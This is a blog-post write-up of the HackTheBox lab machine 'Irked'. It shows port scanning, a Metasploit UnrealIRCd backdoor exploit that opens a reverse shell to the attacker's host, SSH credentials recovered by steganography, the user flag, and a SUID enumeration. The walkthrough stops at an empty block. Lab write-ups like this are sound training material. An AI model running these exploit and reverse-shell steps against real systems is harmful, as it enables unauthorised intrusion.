---
layout: post
title: Hackthebox Irked Writeup
categories: HackTheBox
---

<img src="/public/images/2019-04-20/irked_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Irked" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.117 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-29 23:55 EET
Nmap scan report for 10.10.10.117
Host is up (0.037s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38929/tcp  status
|_  100024  1          55964/udp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
38929/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.62 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.117/

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.117/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/04/14 18:02:39 Starting gobuster
=====================================================
/manual (Status: 301)
/server-status (Status: 403)
=====================================================
2019/04/14 18:15:34 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
We can find a vulnerability of "UnrealIRC" on Exploit database.
{% highlight shell %}
root@kali:~# searchsploit unrealirc
--------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                         |  Path
                                                                                       | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------- ----------------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                           | exploits/linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                | exploits/windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                         | exploits/linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                              | exploits/windows/dos/27407.pl
--------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

To execute the exploit, launch metasploit console.
{% highlight shell %}
msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhost 10.10.10.117
rhost => 10.10.10.117
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697
rport => 6697
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 10.10.14.23:4444 
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Uccg9OJybaPvTmSP;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "Uccg9OJybaPvTmSP\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.117:51673) at 2019-04-14 17:49:40 +0300

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
{% endhighlight %}

In directory "/home/djmardov/Documents", we can find user.txt and interesting file ".backup".<br>
Since we're not use djmardov, we don't have a permission to read user.txt
{% highlight shell %}
pwd
/home/djmardov/Documents
ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
{% endhighlight %}

Sounds the content of .backup is password for "steganography"
{% highlight shell %}
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
{% endhighlight %}

On the top page of port 80, we can find a image file "irked.jpg"
![placeholder](https://inar1.github.io/public/images/2019-04-20/2019-04-14-18-42-16.png)

We can use <a href=''>this website</a> to decode the data of irked.jpg.<br>
The data achieved is "Kab6h+m+bbp2J:HG".<br>
{% highlight shell %}
djmardov:Kab6h+m+bbp2J:HG
{% endhighlight %}

We can take advantage of the credential above for ssh connection.
{% highlight shell %}
root@kali:~# ssh djmardov@10.10.10.117
djmardov@10.10.10.117's password: 

~~~

Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ 
{% endhighlight %}

unlike other boxes, user.txt in in a directory "Documents".
{% highlight shell %}
djmardov@irked:~$ cat Documents/user.txt
4a66a78b12dc0e661a59d3f5c0267a8e
{% endhighlight %}

### 3. Getting Root
By enumeration, we can find some binary files which have SUID.
{% highlight shell %}
djmardov@irked:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
{% endhighlight %}

We can see an unordinary binary file "viewuser".
{% highlight shell %}
djmardov@irked:~$ /usr/bin/viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-11 15:02 (:0)
djmardov pts/0        2019-04-14 11:05 (10.10.14.23)
sh: 1: /tmp/listusers: not found
{% endhighlight %}

Sounds like we need an input for "viewuser".<br>
Try to let this binary read "root.txt".
{% highlight shell %}

{% endhighlight %}
